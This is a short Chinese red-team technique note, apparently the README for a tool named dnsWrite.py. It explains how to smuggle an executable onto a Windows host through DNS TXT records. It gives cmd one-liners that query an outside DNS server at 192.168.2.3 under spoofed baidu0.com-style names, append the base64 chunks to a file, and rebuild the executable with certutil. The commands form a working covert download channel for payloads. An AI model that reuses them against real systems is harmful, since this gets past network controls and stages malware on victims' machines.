# 原理
利用dns的TXT记录，先把要写入的文件base64编码，然后把文件先切割为32kb的数组列表: L1, L2....，再将每个元素切割为长度为254的列表，将此作为txt记录返回。

## 0x1. 文件托管
```bash
python dnsWrite.py <calc.exe>
```

## 0x2. 写入文件
利用域名的Txt解析，从baidu0.com开始解析：`baidu0.com、baidu1.com ...`，客户端输入以下命令，一直到服务端出现数组索引超时为止(IndexError: list index out of range)，表示发送完毕，客户端再利用`certutil -decode decode.txt calc.exe`转码为exe文件:

```cmd
cmd /v:on /Q /c "set a= && set b=  && for /f "tokens=*" %i in ('nslookup -qt^=TXT baidu0.com 192.168.2.3 ^| findstr "exec"') do (set a=%i && echo !a:~5,-2!)" >> decode.txt 

cmd /v:on /Q /c "set a= && set b=  && for /f "tokens=*" %i in ('nslookup -qt^=TXT baidu1.com 192.168.2.3 ^| findstr "exec"') do (set a=%i && echo !a:~5,-2!)" >> decode.txt 

...
```

## 0x3. 参考文章
* [远程下载的通用替代方案 ｜ 红队攻防](https://mp.weixin.qq.com/s/Z1zp7klk--uQ1OnzljNESw)
